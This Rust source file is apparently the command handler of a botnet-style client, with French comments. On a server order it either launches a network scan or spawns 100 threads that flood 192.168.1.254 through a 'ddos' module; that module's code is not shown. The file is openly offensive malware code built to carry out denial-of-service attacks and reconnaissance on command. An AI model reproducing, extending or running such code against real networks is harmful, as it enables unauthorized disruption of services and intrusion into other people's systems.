
use std::thread;
use std::thread::JoinHandle;

mod scan;
mod ddos;

use std::borrow::Cow;


pub(crate) fn ordre_du_srv(mut ordre: String) { //faudra changer ca en JSON


    if ordre == "scan" {

        println!("Lancement du scan réseau");
        let t = thread::spawn(move|| { scan::scan(scan::find_net()); });

    }else if ordre == "ddos" {

            println!("Lancement de l'attaque ddos avancée");
            for i in 0..100 {
                println!("Lancement de l'attaque ddos n°{}", i);
                let ddos = thread::spawn(move|| { ddos::ping("192.168.1.254"); });
                println!("Fin de l'attaque ddos n°{}", i);
            }


    }else {
        println!("pass")
    }

}
